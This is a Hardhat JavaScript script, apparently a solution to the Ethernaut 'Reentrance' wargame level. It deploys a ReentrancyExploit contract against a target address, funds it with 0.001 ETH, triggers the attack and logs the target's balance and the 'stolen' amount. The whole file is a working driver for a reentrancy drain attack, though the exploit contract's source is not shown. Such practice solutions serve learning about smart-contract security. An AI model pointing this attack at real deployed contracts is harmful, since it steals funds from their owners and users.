const hre = require('hardhat');

async function main() {
  const [player] = await hre.ethers.getSigners();
  console.log('Attacking Reentrancy with account:', player.address);

  const targetAddress = process.env.ETHERNAUT_REENTRANCE;
  if (!targetAddress) {
    console.error('Set ETHERNAUT_REENTRANCE in .env');
    return;
  }

  // Check target balance
  const target = await hre.ethers.getContractAt('IReentrance', targetAddress);
  const balance = await hre.ethers.provider.getBalance(targetAddress);
  console.log('Target balance:', hre.ethers.utils.formatEther(balance), 'ETH');

  // Deploy exploit
  const ReentrancyExploit = await hre.ethers.getContractFactory('ReentrancyExploit');
  const exploit = await ReentrancyExploit.deploy(targetAddress);
  await exploit.deployed();
  console.log('Exploit deployed:', exploit.address);

  // Fund the exploit contract
  const depositAmount = hre.ethers.utils.parseEther('0.001');
  console.log('Funding exploit with:', hre.ethers.utils.formatEther(depositAmount), 'ETH');

  // Execute attack
  console.log('Executing reentrancy attack...');
  const tx = await exploit.attack({ value: depositAmount });
  await tx.wait();

  // Check results
  const newBalance = await hre.ethers.provider.getBalance(targetAddress);
  const stolen = await exploit.getBalance();
  console.log('Target balance after:', hre.ethers.utils.formatEther(newBalance), 'ETH');
  console.log('Stolen amount:', hre.ethers.utils.formatEther(stolen), 'ETH');
  console.log('Attack successful:', stolen.gt(depositAmount));
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
